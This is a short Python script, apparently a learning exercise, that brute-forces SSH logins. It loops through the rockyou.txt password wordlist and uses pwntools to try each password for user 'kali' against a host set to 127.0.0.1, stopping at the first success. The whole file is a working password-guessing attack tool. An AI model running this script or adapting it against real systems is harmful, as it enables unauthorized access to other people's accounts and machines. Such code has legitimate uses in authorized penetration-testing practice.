from pwn import *
import paramiko


host     = "127.0.0.1"
username = "kali"
attemps  = 0

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as passwordlist:
    for password in passwordlist:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password '{}'!".format(attemps, password))
            response = ssh(host=host, user=username, password=password, timeout=2)
            if response.connected():
                print(f"valid password found: {password}")
                response.close()
                break
            response.close()
        except Exception as e:
            print("Err found: ", e)
            print("[X] invalid password.")
            attemps += 1
